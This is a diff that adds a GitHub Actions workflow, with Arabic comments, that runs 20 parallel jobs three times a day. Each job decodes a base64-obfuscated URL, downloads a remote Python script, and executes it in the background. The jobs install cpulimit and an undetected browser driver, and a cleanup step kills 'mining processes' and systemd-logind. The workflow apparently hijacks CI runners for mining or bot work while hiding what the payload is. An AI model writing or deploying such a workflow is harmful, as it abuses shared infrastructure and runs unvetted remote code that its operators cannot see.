@@ -1,1 +1,119 @@
+name: Linux Compute Regiment
 
+on:
+  schedule:
+    # تشغيل تلقائي في الأوقات: 01:00، 09:00، 17:00 (توقيت UTC)
+    - cron: '0 1,9,17 * * *'
+
+concurrency:
+  group: compute-regiment-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # جهاز الرقابة الزمنية: يُنهي كامل الـ workflow بعد ساعة واحدة
+  # =================================================================
+  temporal-overseer:
+    name: "Temporal Overseer"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+    steps:
+      - name: Activate Global Time Cutoff
+        run: |
+          echo "[OVERSEER] Temporal overseer activated. All tasks will be terminated at the 60-minute mark."
+          echo "[OVERSEER] Monitoring run identifier: ${{ github.run_id }}"
+          
+          # الانتظار لمدة ساعة كاملة (3600 ثانية)
+          sleep 3600
+          
+          echo "[OVERSEER] The 60-minute mark has been reached! Issuing cancellation directive..."
+          
+          # إرسال أمر الإلغاء الشامل إلى GitHub
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[OVERSEER] Cancellation directive delivered."
+
+  # =================================================================
+  # المهمة الرئيسية: تشغيل الوحدات الحاسوبية
+  # =================================================================
+  assemble-regiment:
+    name: "RegimentUnit-${{ matrix.unit_number }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_number: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      # [أولاً] تحضير طبقة البنية التحتية
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      - name: Prepare Infrastructure Layer
+        run: |
+          echo "[INFRA] Preparing RegimentUnit-${{ matrix.unit_number }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y cpulimit curl python3-pip
+
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      # [ثانياً] جلب النص التنفيذي
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      - name: Acquire Runtime Script
+        run: |
+          echo "[ACQUIRE] Fetching app_task.py from remote repository..."
+          REPO_ENDPOINT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$REPO_ENDPOINT" -o app_task.py
+          echo "[ACQUIRE] Script stored locally."
+
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      # [ثالثاً] تجهيز مكتبات بايثون
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      - name: Install Python Libraries
+        run: |
+          echo "[LIBS] Installing required Python libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      # [رابعاً] تنفيذ المهمة مع حارس زمني
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      - name: Run Task with Time Warden
+        run: |
+          echo ">> Deploying workload on RegimentUnit-${{ matrix.unit_number }}..."
+          
+          # إطلاق السكربت في الخلفية
+          python3 app_task.py &
+          REGIMENT_PID=$!
+          
+          echo ">> Time warden active. Threshold: 74 minutes."
+          
+          # الانتظار حتى انتهاء المدة المقررة
+          sleep 4440
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $REGIMENT_PID 2>/dev/null; then
+            echo ">> Threshold reached! Halting workload..."
+            kill -9 $REGIMENT_PID
+            echo ">> Workload halted by warden."
+          else
+            echo ">> Workload ended within the threshold."
+          fi
+
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      # [خامساً] تنظيف النظام وإنهاء الوحدة
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      - name: Purge and Finalize
+        run: |
+          echo "[PURGE] RegimentUnit-${{ matrix.unit_number }} finalizing operations."
+          echo "[PURGE] Removing residual cpulimit and mining processes..."
+          sudo pkill -f cpulimit || true
+          sudo pkill -f systemd-logind || true
+          echo "[FINALIZED] RegimentUnit-${{ matrix.unit_number }} finalized."
